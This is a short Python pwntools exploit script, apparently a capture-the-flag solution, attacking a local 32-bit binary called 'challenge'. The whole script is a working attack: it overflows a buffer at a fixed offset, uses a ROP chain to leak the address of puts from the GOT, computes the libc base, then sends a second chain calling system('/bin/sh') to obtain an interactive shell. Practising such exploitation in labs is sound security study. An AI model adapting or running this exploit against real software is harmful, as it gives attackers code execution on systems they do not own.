from pwn import *

OFFSET = 62

# context.log_level = "debug"

s = process("./challenge")
raw_input("Attach GDB")

elf = ELF('./challenge')
rop = ROP(elf)

s.recvuntil("your name?\n")

rop.raw(elf.symbols['puts'])
rop.raw(elf.symbols['vuln'])
rop.raw(elf.got['puts'])

print rop.dump()

s.sendline("A"*OFFSET+flat(rop.chain()))

puts = u32(s.recv(4))

log.success("Leaked puts: "+hex(puts))

libc = ELF("/usr/lib/i386-linux-gnu/libc-2.31.so")
libc_base = puts-libc.symbols['puts']

libc.address = libc_base

libc_rop = ROP(libc)
libc_rop.raw(libc.symbols['system'])
libc_rop.raw(0)
libc_rop.raw(next(libc.search("/bin/sh")))

print(libc_rop.dump())

s.recvuntil("your name?\n")

s.sendline("A"*OFFSET+flat(libc_rop.chain()))

s.interactive()
